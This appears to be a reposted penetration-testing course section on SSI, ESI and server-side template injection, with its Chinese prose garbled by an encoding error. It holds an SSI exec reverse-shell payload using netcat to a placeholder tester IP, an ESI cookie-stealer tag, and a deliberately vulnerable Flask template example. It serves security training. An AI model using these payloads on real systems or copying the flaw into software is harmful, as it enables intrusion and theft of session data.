<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">// Date</span><br><span class="line"><span class="comment">&lt;!--#echo var="DATE_LOCAL" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Modification date of a file</span><br><span class="line"><span class="comment">&lt;!--#flastmod file="index.html" --&gt;</span></span><br><span class="line"></span><br><span class="line">// CGI Program results</span><br><span class="line"><span class="comment">&lt;!--#include virtual="/cgi-bin/counter.pl" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Including a footer</span><br><span class="line"><span class="comment">&lt;!--#include virtual="/footer.html" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Executing commands</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="ls" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Setting variables</span><br><span class="line"><span class="comment">&lt;!--#set var="name" value="Rich" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Including virtual files (same directory)</span><br><span class="line"><span class="comment">&lt;!--#include virtual="file_to_include.html" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Including files (same directory)</span><br><span class="line"><span class="comment">&lt;!--#include file="file_to_include.html" --&gt;</span></span><br><span class="line"></span><br><span class="line">// Print all variables</span><br><span class="line"><span class="comment">&lt;!--#printenv --&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>åœ¨Webåº”ç”¨ç¨‹åºä¸Šä½¿ç”¨SSIå¯ä»¥é€šè¿‡æ£€æŸ¥æ‰©å±•åï¼ˆå¦‚.shtmlã€.shtmæˆ–. stmï¼‰æ¥è¯†åˆ«ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå­˜åœ¨å…è®¸å…¶ä»–æ‰©å±•ï¼ˆå¦‚.htmlï¼‰å¤„ç†SSIæŒ‡ä»¤çš„éé»˜è®¤æœåŠ¡å™¨é…ç½®ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦é€šè¿‡è¾“å…¥å­—æ®µå‘ç›®æ ‡åº”ç”¨ç¨‹åºæäº¤æœ‰æ•ˆè´Ÿè½½ï¼Œä¾‹å¦‚ä¸Šé¢æåˆ°çš„é‚£äº›ï¼Œä»¥æµ‹è¯•SSIæ³¨å…¥ã€‚å¦‚æœå­˜åœ¨æ¼æ´ï¼ŒWebæœåŠ¡å™¨å°†åœ¨å‘ˆç°é¡µé¢ä¹‹å‰è§£æå’Œæ‰§è¡ŒæŒ‡ä»¤ï¼Œä½†è¦æ³¨æ„è¿™äº›æ¼æ´ä¹Ÿå¯èƒ½ä»¥ç›²æ ¼å¼å­˜åœ¨ã€‚æˆåŠŸçš„SSIæ³¨å…¥å¯èƒ½ä¼šå¯¼è‡´ä»æœ¬åœ°æ–‡ä»¶ä¸­æå–æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³åœ¨ç›®æ ‡WebæœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤ã€‚</p>
<h2 id="SSI-Injection-Exploitation-Example"><a href="#SSI-Injection-Exploitation-Example" class="headerlink" title="SSI Injection Exploitation Example"></a>SSI Injection Exploitation Example</h2><p>è®©æˆ‘ä»¬åœ¨ä¸€ä¸ªé¢å‘äº’è”ç½‘çš„Webåº”ç”¨ç¨‹åºä¸Šç»ƒä¹ SSIæ³¨å…¥ï¼ˆç›®æ ‡å¯ä»¥åœ¨æœ¬èŠ‚çš„æœ€åç”Ÿæˆï¼‰ã€‚å¯¼èˆªåˆ°æœ¬èŠ‚çš„ç»“å°¾å¹¶å•å‡»<code>Click here to spawn the target system</code>ï¼Œç„¶åä½¿ç”¨æä¾›çš„Pwnboxæˆ–æœ¬åœ°VMæ¥æ²¿ç€ã€‚é€šè¿‡æµè§ˆåˆ°äº§ç”Ÿçš„ç›®æ ‡ï¼Œæˆ‘ä»¬é‡åˆ°äº†ä¸‹é¢çš„ã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_1.png" alt="image"></p>
<p>è®©æˆ‘ä»¬é€šè¿‡æäº¤ä¸Šä¸€èŠ‚ä¸­æåˆ°çš„ä¸€äº›SSIæŒ‡ä»¤æ¥é‡ç‚¹è¯†åˆ«SSIæ³¨å…¥æ¼æ´ã€‚</p>
<p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">1. <span class="comment">&lt;!--#echo var="DATE_LOCAL" --&gt;</span></span><br><span class="line">2. <span class="comment">&lt;!--#printenv --&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="Date-æ—¥æœŸ"><a href="#Date-æ—¥æœŸ" class="headerlink" title="Date æ—¥æœŸ"></a>Date æ—¥æœŸ</h4><p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_1.5.png" alt="image"></p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_2.png" alt="image"></p>
<h4 id="All-Variables"><a href="#All-Variables" class="headerlink" title="All Variables"></a>All Variables</h4><p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_3.png" alt="image"></p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_4.png" alt="image"></p>
<p>æ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼Œåº”ç”¨ç¨‹åºç¡®å®å®¹æ˜“å—åˆ°SSIæ³¨å…¥ï¼ ç°åœ¨ï¼Œç»§ç»­æœ¬èŠ‚ç»“å°¾å¤„çš„ç»ƒä¹ ï¼Œå¹¶åˆ©ç”¨ä¸Šä¸€èŠ‚ä¸­åˆ—å‡ºçš„å¯èƒ½å¯¼è‡´å¯¹åº•å±‚ç³»ç»Ÿæ‰§è¡Œå‘½ä»¤çš„ä»»ä½•SSIæŒ‡ä»¤æ¥å®Œæˆç»ƒä¹ ã€‚</p>
<p><strong>æ³¨æ„ï¼š</strong>æ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼Œé€šè¿‡SSIåœ¨ç›®æ ‡åº”ç”¨ç¨‹åºä¸Šè¿è¡ŒOSå‘½ä»¤æ˜¯å¯èƒ½çš„ï¼Œä½†æ˜¯è°ä¸å–œæ¬¢shellå‘¢ï¼Ÿè¯·è®°ä½ä»¥ä¸‹åå‘shellè´Ÿè½½ï¼Œå³ä½¿åœ¨é»˜è®¤æƒ…å†µä¸‹ä¸åŒ…æ‹¬æ‰§è¡ŒåŠŸèƒ½çš„OpenBSD-netcatä¸Šä¹Ÿå¯ä»¥å·¥ä½œã€‚è¿˜è¦æ³¨æ„ï¼Œç”±äºç½‘ç»œé™åˆ¶ï¼Œæ‚¨å°†æ— æ³•åœ¨æœ¬èŠ‚çš„ç»ƒä¹ ä¸­è·å¾—åå‘shellï¼ </p>
<h4 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h4><p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd="mkfifo /tmp/foo;nc &lt;PENTESTER IP&gt; &lt;PORT&gt; 0&lt;/tmp/foo|/bin/bash 1&gt;/tmp/foo;rm /tmp/foo" --&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<ul>
<li><code>mkfifo /tmp/foo</code>ï¼šåœ¨<code>/tmp/foo</code>ä¸­åˆ›å»ºä¸€ä¸ªFIFOç‰¹æ®Šæ–‡ä»¶</li>
<li><code>nc &lt;IP&gt; &lt;PORT&gt; 0&lt;/tmp/foo</code>ï¼šè¿æ¥åˆ°pentesteræœºå™¨å¹¶é‡å®šå‘æ ‡å‡†è¾“å…¥æè¿°ç¬¦</li>
<li><code>| bin/bash 1&gt;/tmp/foo</code>ï¼šæ‰§è¡Œ<code>/bin/bash</code>å°†æ ‡å‡†è¾“å‡ºæè¿°ç¬¦é‡å®šå‘åˆ°<code>/tmp/foo</code></li>
<li><code>rm /tmp/foo</code>ï¼šåˆ é™¤FIFOæ–‡ä»¶</li>
</ul>
<h1 id="Edge-Side-Includes-ESI"><a href="#Edge-Side-Includes-ESI" class="headerlink" title="Edge-Side Includes (ESI)"></a>Edge-Side Includes (ESI)</h1><p>Edge Side Includesï¼ˆ<code>ESI</code>ï¼‰æ˜¯ä¸€ç§åŸºäºXMLçš„æ ‡è®°è¯­è¨€ï¼Œç”¨äºé€šè¿‡å¯ç”¨Webå†…å®¹çš„é‡ç¼“å­˜æ¥è§£å†³æ€§èƒ½é—®é¢˜ï¼Œå¦åˆ™é€šè¿‡ä¼ ç»Ÿçš„ç¼“å­˜åè®®å°†æ— æ³•å­˜å‚¨è¿™äº›å†…å®¹ã€‚Edge Side  Includesï¼ˆESIï¼‰å…è®¸åœ¨ç½‘ç»œè¾¹ç¼˜ï¼ˆå†…å®¹äº¤ä»˜ç½‘ç»œã€ç”¨æˆ·æµè§ˆå™¨æˆ–åå‘ä»£ç†ï¼‰è¿›è¡ŒåŠ¨æ€Webå†…å®¹ç»„è£…ï¼Œæ–¹æ³•æ˜¯é€šè¿‡ESIå…ƒç´ æ ‡è®°ï¼ˆXMLæ ‡è®°ï¼‰æŒ‡ç¤ºé¡µé¢å¤„ç†å™¨å®Œæˆé¡µé¢ç»„è£…éœ€è¦åšä»€ä¹ˆã€‚</p>
<p>ESIæ ‡è®°ç”¨äºæŒ‡ç¤ºHTTPä»£ç†ï¼ˆåå‘ä»£ç†ã€ç¼“å­˜æœåŠ¡å™¨ç­‰ï¼‰ä»¥è·å–å…³äºå…·æœ‰å·²ç»é«˜é€Ÿç¼“å­˜çš„æ¨¡æ¿çš„ç½‘é¡µçš„é™„åŠ ä¿¡æ¯ã€‚åœ¨å°†ç½‘é¡µå‘ˆç°ç»™æœ€ç»ˆç”¨æˆ·ä¹‹å‰ï¼Œè¯¥ä¿¡æ¯å¯èƒ½æ¥è‡ªå¦ä¸€ä¸ªæœåŠ¡å™¨ã€‚ESIä½¿å®Œå…¨ç¼“å­˜çš„ç½‘é¡µåŒ…å«åŠ¨æ€å†…å®¹ã€‚</p>
<p>å½“æ”»å‡»è€…è®¾æ³•åœ¨HTTPå“åº”ä¸­åæ˜ æ¶æ„ESIæ ‡è®°æ—¶ï¼Œä¼šå‘ç”Ÿè¾¹ç¼˜ä¾§åŒ…å«æ³¨å…¥ã€‚æ­¤æ¼æ´çš„æ ¹æœ¬åŸå› æ˜¯HTTPä»£ç†æ— æ³•éªŒè¯ESIæ ‡è®°æ¥æºã€‚ä»–ä»¬å°†å¾ˆä¹æ„è§£æå’Œè¯„ä¼°ä¸Šæ¸¸æœåŠ¡å™¨çš„åˆæ³•ESIæ ‡è®°ä»¥åŠæ”»å‡»è€…çš„æ¶æ„ESIæ ‡è®°ã€‚</p>
<p>è™½ç„¶æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨æœç´¢<code>Surrogate-Control: content="ESI/1.0"</code>æ—¶æ£€æŸ¥å“åº”å¤´æ¥è¯†åˆ«ESIçš„ä½¿ç”¨ï¼Œä½†æˆ‘ä»¬é€šå¸¸éœ€è¦ä½¿ç”¨ç›²æ”»å‡»æ–¹æ³•æ¥æ£€æµ‹ESIæ˜¯å¦åœ¨ä½¿ç”¨ä¸­ã€‚å…·ä½“æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°†ESIæ ‡è®°å¼•å…¥åˆ°HTTPè¯·æ±‚ä¸­ï¼Œä»¥æŸ¥çœ‹æ˜¯å¦æœ‰ä»»ä½•ä¸­é—´ä»£ç†æ­£åœ¨è§£æè¯·æ±‚ä»¥åŠæ˜¯å¦å¯ä»¥è¿›è¡ŒESIæ³¨å…¥ã€‚ä¸€äº›æœ‰ç”¨çš„ESIæ ‡è®°æ˜¯ï¼š</p>
<h4 id="ESI-Tags"><a href="#ESI-Tags" class="headerlink" title="ESI Tags"></a>ESI Tags</h4><p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">// Basic detection</span><br><span class="line"><span class="tag">&lt;<span class="name">esi:</span> <span class="attr">include</span> <span class="attr">src</span>=<span class="string">http://</span>&lt;<span class="attr">PENTESTER</span> <span class="attr">IP</span>&gt;</span>&gt;</span><br><span class="line"></span><br><span class="line">// XSS Exploitation Example</span><br><span class="line"><span class="tag">&lt;<span class="name">esi:</span> <span class="attr">include</span> <span class="attr">src</span>=<span class="string">http://</span>&lt;<span class="attr">PENTESTER</span> <span class="attr">IP</span>&gt;</span>/<span class="tag">&lt;<span class="name">XSSPAYLOAD.html</span>&gt;</span>&gt;</span><br><span class="line"></span><br><span class="line">// Cookie Stealer (bypass httpOnly flag)</span><br><span class="line"><span class="tag">&lt;<span class="name">esi:</span> <span class="attr">include</span> <span class="attr">src</span>=<span class="string">http://</span>&lt;<span class="attr">PENTESTER</span> <span class="attr">IP</span>&gt;</span>/?cookie_stealer.php?=$(HTTP_COOKIE)&gt;</span><br><span class="line"></span><br><span class="line">// Introduce private local files (Not LFI per se)</span><br><span class="line"><span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">"supersecret.txt"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// Valid for Akamai, sends debug information in the response</span><br><span class="line"><span class="tag">&lt;<span class="name">esi:debug</span>/&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå½“å¤„ç†ESIæŒ‡ä»¤çš„åº”ç”¨ç¨‹åºæ”¯æŒXMLï¼ˆä¸€ç§ç”¨äºè½¬æ¢XMLæ–‡ä»¶çš„åŠ¨æ€è¯­è¨€ï¼‰æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†<code>dca=xslt</code>ä¼ é€’ç»™payloadã€‚æ‰€é€‰çš„XMLæ–‡ä»¶å°†è¢«å¤„ç†ï¼Œå¯èƒ½ä¼šæ‰§è¡ŒXMLå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼ˆXXEï¼‰ï¼Œä½†æœ‰ä¸€äº›é™åˆ¶ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/">GoSecure</a>åˆ›å»ºäº†ä¸€ä¸ªè¡¨ï¼Œä»¥å¸®åŠ©æˆ‘ä»¬äº†è§£å¯èƒ½çš„æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®æ”¯æŒçš„åŠŸèƒ½ï¼Œé’ˆå¯¹ä¸åŒçš„å…·æœ‰ESIåŠŸèƒ½çš„è½¯ä»¶è¿›è¡Œå°è¯•ã€‚è®©æˆ‘ä»¬é¦–å…ˆå¯¹ä¸‹è¡¨çš„åˆ—åè¿›è¡Œä¸€äº›è§£é‡Šï¼š</p>
<ul>
<li>åŒ…æ‹¬ï¼šæ”¯æŒ<code>&lt;esi:includes&gt;</code>æŒ‡ä»¤</li>
<li>Varsï¼šæ”¯æŒ<code>&lt;esi:vars&gt;</code>æŒ‡ä»¤ã€‚ç”¨äºç»•è¿‡XSSè¿‡æ»¤å™¨</li>
<li>Cookieï¼šESIå¼•æ“å¯è®¿é—®æ–‡æ¡£Cookie</li>
<li>éœ€è¦ä¸Šæ¸¸æ ‡å¤´ï¼šé™¤éä¸Šæ¸¸åº”ç”¨ç¨‹åºæä¾›æ ‡å¤´ï¼Œå¦åˆ™ä»£ç†åº”ç”¨ç¨‹åºå°†ä¸ä¼šå¤„ç†ESIè¯­å¥</li>
<li>ä¸»æœºå…è®¸åˆ—è¡¨ï¼šåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒESIåŒ…å«åªèƒ½ä»å…è®¸çš„æœåŠ¡å™¨ä¸»æœºï¼Œä½¿SSRFï¼Œä¾‹å¦‚ï¼Œåªèƒ½å¯¹è¿™äº›ä¸»æœº</li>
</ul>
<table>
<thead>
<tr>
<th><strong>Software</strong></th>
<th><strong>Includes</strong></th>
<th><strong>Vars</strong></th>
<th><strong>Cookies</strong></th>
<th><strong>Upstream Headers Required</strong></th>
<th><strong>Host Whitelist</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Squid3</td>
<td>Yes</td>
<td>Yes</td>
<td>Yesæ˜¯çš„</td>
<td>Yes</td>
<td>No</td>
</tr>
<tr>
<td>Varnish Cache</td>
<td>Yes</td>
<td>No</td>
<td>Noæ²¡æœ‰</td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td>Fastly</td>
<td>Yes</td>
<td>No</td>
<td>Noæ²¡æœ‰</td>
<td>No</td>
<td>Yes</td>
</tr>
<tr>
<td>Akamai ESI Test Server (ETS)</td>
<td>Yes</td>
<td>Yes</td>
<td>Yesæ˜¯çš„</td>
<td>No</td>
<td>No</td>
</tr>
<tr>
<td>NodeJS esi</td>
<td>Yes</td>
<td>Yes</td>
<td>Yesæ˜¯çš„</td>
<td>No</td>
<td>No</td>
</tr>
<tr>
<td>NodeJS nodesi</td>
<td>Yes</td>
<td>No</td>
<td>Noæ²¡æœ‰</td>
<td>No</td>
<td>Optional</td>
</tr>
</tbody></table>
<h1 id="Server-Side-Template-Injections"><a href="#Server-Side-Template-Injections" class="headerlink" title="Server-Side Template Injections"></a>Server-Side Template Injections</h1><p>æ¨¡æ¿å¼•æ“ä»æ¨¡æ¿æ–‡æ¡£ä¸­è¯»å–æ ‡è®°åŒ–çš„å­—ç¬¦ä¸²ï¼Œå¹¶åœ¨è¾“å‡ºæ–‡æ¡£ä¸­ç”Ÿæˆå…·æœ‰å®é™…å€¼çš„å‘ˆç°å­—ç¬¦ä¸²ã€‚æ¨¡æ¿é€šå¸¸è¢«Webå¼€å‘äººå‘˜ç”¨ä½œåˆ›å»ºåŠ¨æ€ç½‘ç«™å†…å®¹çš„ä¸­é—´æ ¼å¼ã€‚æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆ<code>SSTI</code>ï¼‰æœ¬è´¨ä¸Šæ˜¯åœ¨æ¨¡æ¿ä¸­æ³¨å…¥æ¶æ„æ¨¡æ¿æŒ‡ä»¤ï¼Œåˆ©ç”¨æ¨¡æ¿å¼•æ“å°†ç”¨æˆ·è¾“å…¥ä¸ç»™å®šæ¨¡æ¿ä¸å®‰å…¨åœ°æ··åˆåœ¨ä¸€èµ·ã€‚</p>
<p>ä¸‹é¢ä½ ä¼šå‘ç°ä¸€äº›åº”ç”¨ç¨‹åºï¼Œä½ å¯ä»¥åœ¨æœ¬åœ°è¿è¡Œï¼Œä»¥æ›´å¥½åœ°ç†è§£æ¨¡æ¿ã€‚å¦‚æœä½ ä¸èƒ½åšåˆ°è¿™ä¸€ç‚¹ï¼Œä¸è¦æ‹…å¿ƒã€‚ä»¥ä¸‹å„èŠ‚ä»‹ç»äº†ä½¿ç”¨æ¨¡æ¿çš„å„ç§åº”ç”¨ç¨‹åºçš„ç»ƒä¹ ã€‚</p>
<p>ç°åœ¨è®©æˆ‘ä»¬è€ƒè™‘ä»¥ä¸‹æ–‡ä»¶ï¼š</p>
<p>app.py</p>
<p>Code:</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">"./"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">"/"</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	title = <span class="string">"Index Page"</span></span><br><span class="line">	content = <span class="string">"Some content"</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, title=title, content=content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	app.run(host=<span class="string">"127.0.0.1"</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>index.html</p>
<p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>{{title}}<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>{{content}}<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>å½“æˆ‘ä»¬è®¿é—®ç½‘ç«™æ—¶ï¼Œæˆ‘ä»¬å°†æ”¶åˆ°ä¸€ä¸ªHTMLé¡µé¢ï¼Œå…¶ä¸­åŒ…å«æ¨¡æ¿é¡µé¢ä¸ŠåŒæ‹¬å·å†…çš„<code>title</code>å’Œ<code>content</code>å˜é‡çš„å€¼ã€‚éå¸¸ç®€å•ï¼Œæ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼Œç”¨æˆ·å¯¹å˜é‡æ²¡æœ‰ä»»ä½•æ§åˆ¶æƒã€‚ä½†æ˜¯ï¼Œå½“ç”¨æˆ·è¾“å…¥æ²¡æœ‰ç»è¿‡ä»»ä½•éªŒè¯å°±è¿›å…¥æ¨¡æ¿æ—¶ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>app.py</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">"./"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">"/"</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	title = <span class="string">"Index Page"</span></span><br><span class="line">	content = <span class="string">"Some content"</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, title=title, content=content)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">"/hello"</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">	name = request.args.get(<span class="string">"name"</span>)</span><br><span class="line">	<span class="keyword">if</span> name == <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">return</span> redirect(<span class="string">f'<span class="subst">{url_for(<span class="string">"hello"</span>)}</span>?name=guest'</span>)</span><br><span class="line">	htmldoc = <span class="string">f"""</span></span><br><span class="line"><span class="string">	&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">	&lt;h1&gt;Hello&lt;/h1&gt;</span></span><br><span class="line"><span class="string">	&lt;a&gt;Nice to see you <span class="subst">{name}</span>&lt;/a&gt;</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">	&lt;/html&gt;</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="keyword">return</span> render_template_string(htmldoc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	app.run(host=<span class="string">"127.0.0.1"</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ³¨å…¥ä¸€ä¸ªæ¨¡æ¿è¡¨è¾¾å¼ï¼ŒæœåŠ¡å™¨å°†è¯„ä¼°å®ƒã€‚è¿™æ˜¯ä¸€ä¸ªå®‰å…¨é—®é¢˜ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç›®æ ‡åº”ç”¨ç¨‹åºä¸Šçš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œæ­£å¦‚æˆ‘ä»¬å°†åœ¨ä¸‹é¢çš„éƒ¨åˆ†ä¸­çœ‹åˆ°çš„é‚£æ ·ã€‚</p>
<p>cURL - Interacting with the Target</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gis 'http://127.0.0.1:5000/hello?name={{7*7}}'</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 79</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.9.7</span><br><span class="line">Date: Mon, 25 Oct 2021 00:12:40 GMT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&lt;html&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;Hello&lt;/h1&gt;</span><br><span class="line">	&lt;a&gt;Nice to see you 49&lt;/a&gt; # &lt;-- Expresion evaluated</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">	&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<h2 id="SSTIæ ‡è¯†"><a href="#SSTIæ ‡è¯†" class="headerlink" title="SSTIæ ‡è¯†"></a>SSTIæ ‡è¯†</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨æˆ‘ä»¬æ§åˆ¶çš„è¾“å…¥ä¸­æ³¨å…¥ä¸åŒçš„æ ‡è®°æ¥æ£€æµ‹SSTIæ¼æ´ï¼Œä»¥æŸ¥çœ‹å®ƒä»¬æ˜¯å¦åœ¨å“åº”ä¸­è¿›è¡Œäº†è¯„ä¼°ã€‚æˆ‘ä»¬ä¸ä¸€å®šéœ€è¦çœ‹åˆ°æ³¨å…¥çš„æ•°æ®åæ˜ åœ¨æˆ‘ä»¬æ”¶åˆ°çš„å“åº”ä¸­ã€‚æœ‰æ—¶å®ƒåªæ˜¯åœ¨ä¸åŒçš„é¡µé¢ä¸Šè¿›è¡Œè¯„ä¼°ï¼ˆç›²ï¼‰ã€‚</p>
<p>æ£€æµ‹è¿›æ ·çš„æœ€ç®€å•æ–¹æ³•æ˜¯åœ¨èŠ±æ‹¬å·ä¸­æä¾›æ•°å­¦è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ï¼š</p>
<p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">{7*7}</span><br><span class="line">${7*7}</span><br><span class="line">#{7*7}</span><br><span class="line">%{7*7}</span><br><span class="line">{{7*7}}</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure>

<p>å½“æ³¨å…¥è¿™äº›æœ‰æ•ˆè´Ÿè½½æ—¶ï¼Œæˆ‘ä»¬å°†åœ¨å“åº”ä¸­æŸ¥æ‰¾â€œ49â€ï¼Œä»¥ç¡®å®šå‘ç”Ÿäº†æœåŠ¡å™¨ç«¯è¯„ä¼°ã€‚</p>
<p>è¯†åˆ«SSTIæœ€å›°éš¾çš„æ–¹æ³•æ˜¯é€šè¿‡æ³¨å…¥æ¨¡æ¿è¡¨è¾¾å¼ä¸­ä½¿ç”¨çš„ç‰¹æ®Šå­—ç¬¦ç»„åˆæ¥æ¨¡ç³Šæ¨¡æ¿ã€‚è¿™äº›å­—ç¬¦åŒ…æ‹¬<code>${{&lt;%[%'"}}%\</code>ã€‚å¦‚æœå¯¼è‡´å¼‚å¸¸ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ§åˆ¶æœåŠ¡å™¨æ ¹æ®æ¨¡æ¿è¡¨è¾¾å¼è§£é‡Šçš„å†…å®¹ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">Tplmap</a>æˆ–J2EE Scanï¼ˆBurp Proï¼‰ç­‰å·¥å…·æ¥è‡ªåŠ¨æµ‹è¯•SSTIæ¼æ´æˆ–åˆ›å»ºæœ‰æ•ˆè´Ÿè½½åˆ—è¡¨ä»¥ç”¨äºBurp Intruderæˆ–ZAPã€‚</p>
<p>ä¸‹é¢æ¥è‡ª<a target="_blank" rel="noopener" href="https://portswigger.net/research/server-side-template-injection">PortsSwigger</a>çš„å›¾è¡¨å¯ä»¥å¸®åŠ©æˆ‘ä»¬ç¡®å®šæˆ‘ä»¬æ˜¯å¦æ­£åœ¨å¤„ç†SSTIæ¼æ´ï¼Œå¹¶ç¡®å®šåº•å±‚æ¨¡æ¿å¼•æ“ã€‚</p>
